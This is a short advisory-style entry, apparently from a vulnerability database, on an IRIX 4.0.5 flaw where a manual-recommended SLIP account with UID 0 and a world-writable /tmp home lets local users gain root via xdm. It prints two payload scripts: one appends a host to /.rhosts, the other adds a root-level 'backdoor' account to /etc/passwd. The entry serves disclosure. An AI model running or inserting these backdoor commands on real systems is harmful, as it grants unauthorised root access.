  "Description": "Installing SLIP as described in the \"IRIX Network Administration Guide\"\n(IRIX 4.0.5) on a machine that's also running xdm will allow anyone on\nthat machine to get into root!  At the top of page 7-6 the manual\ninstructs the user to add (something like) the following line to\n/etc/passwd:\n\nslip-wenders:3RsB768WRAN2.:0:0:slip:/tmp:/usr/etc/remoteslip\n\nThe problem with this is that /tmp (the home directory) is world\nwritable, so by creating /tmp/.xsession with the following:\n\n#!/bin/sh\necho machine.domain. userid >> /.rhosts\n\nor\n\n#!/bin/sh\necho backdoor:3RsB768WRAN2.:0:0:forget me:/:/bin/sh >> /etc/passwd\n\nWill have obvious repercussions after an xdm login to slip-wenders fails.",
